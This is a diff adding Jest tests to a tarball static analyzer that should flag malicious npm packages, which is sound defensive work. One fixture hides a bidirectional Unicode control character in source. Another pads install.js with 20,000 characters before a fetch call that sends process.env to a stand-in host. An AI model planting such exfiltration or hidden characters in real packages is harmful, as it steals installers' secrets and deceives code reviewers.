@@ -112,4 +112,41 @@ describe('tarball static analyzer', () => {
       ])
     );
   });
+
+  test('flags invisible unicode in executable tarball text', () => {
+    const result = analyzeTarballEntries([
+      {
+        path: 'package/index.js',
+        size: 80,
+        sample: 'const safe = true;\u202E// hidden directional control'
+      }
+    ]);
+
+    expect(result.signals).toEqual([
+      expect.objectContaining({
+        id: 'invisible-unicode-source',
+        severity: 'high',
+        evidence: [
+          expect.objectContaining({
+            value: expect.objectContaining({
+              matchedPattern: 'bidirectional control character'
+            })
+          })
+        ]
+      })
+    ]);
+  });
+
+  test('uses fullText when suspicious content appears beyond sample', () => {
+    const result = analyzeTarballEntries([
+      {
+        path: 'package/install.js',
+        size: 40_000,
+        sample: 'const harmless = true;',
+        fullText: `${'a'.repeat(20_000)} fetch('https://example.invalid', { body: JSON.stringify(process.env) });`
+      }
+    ]);
+
+    expect(result.signals.map((signal) => signal.id)).toContain('process-env-network-exfil');
+  });
 });
